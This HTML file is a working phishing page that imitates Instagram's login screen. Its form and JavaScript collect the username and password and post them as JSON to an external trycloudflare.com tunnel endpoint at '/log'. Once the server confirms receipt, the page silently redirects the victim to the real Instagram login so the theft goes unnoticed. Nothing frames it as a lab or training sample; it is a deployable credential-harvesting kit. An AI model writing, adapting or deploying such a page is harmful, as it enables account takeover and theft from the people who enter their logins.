<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Instagram</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <!-- Instagram uses the Billabong font for the logo -->
  <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet" />
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .box {
      background: #fff;
      padding: 40px 40px 30px;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      width: 350px;
      text-align: center;
      box-shadow: 0 0 5px rgba(0,0,0,0.1);
    }
    .box h1 {
      font-family: 'Billabong', cursive;
      font-size: 60px;
      margin-bottom: 20px;
      color: #262626;
    }
    form {
      display: flex;
      flex-direction: column;
    }
    input {
      width: 100%;
      margin: 6px 0;
      padding: 9px 8px;
      font-size: 14px;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background: #fafafa;
      box-sizing: border-box;
    }
    button {
      width: 100%;
      margin-top: 12px;
      background: #3897f0;
      border: none;
      color: white;
      font-weight: bold;
      font-size: 14px;
      padding: 8px 0;
      border-radius: 4px;
      cursor: pointer;
    }
    button:hover {
      background: #2d76d9;
    }
    .footer {
      margin-top: 20px;
      font-size: 13px;
      color: #999;
    }
    a {
      color: #00376b;
      text-decoration: none;
    }
    a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="box">
    <h1>Instagram</h1>
    <form id="loginForm" method="POST" action="https://this-gothic-drugs-vb.trycloudflare.com/log">
      <input type="text" name="username" placeholder="Phone number, username, or email" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Log In</button>
    </form>
    <div class="footer">
      <a href="https://instagram.com/accounts/password/reset/">Forgot password?</a>
    </div>
  </div>

  <script>
    const form = document.getElementById('loginForm');
    form.addEventListener('submit', async e => {
      e.preventDefault();
      const formData = new FormData(form);
      const data = {
        username: formData.get('username'),
        password: formData.get('password'),
      };
      try {
        const response = await fetch(form.action, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data),
        });
        const result = await response.json();
        if (result.received) {
          // Redirect to real Instagram login page with 2FA and real auth flow
          window.location.href = 'https://www.instagram.com/accounts/login/?mtn';
        } else {
          alert('Error submitting credentials. Try again.');
        }
      } catch (err) {
        alert('Server error. Try again later.');
      }
    });
  </script>
</body>
</html>
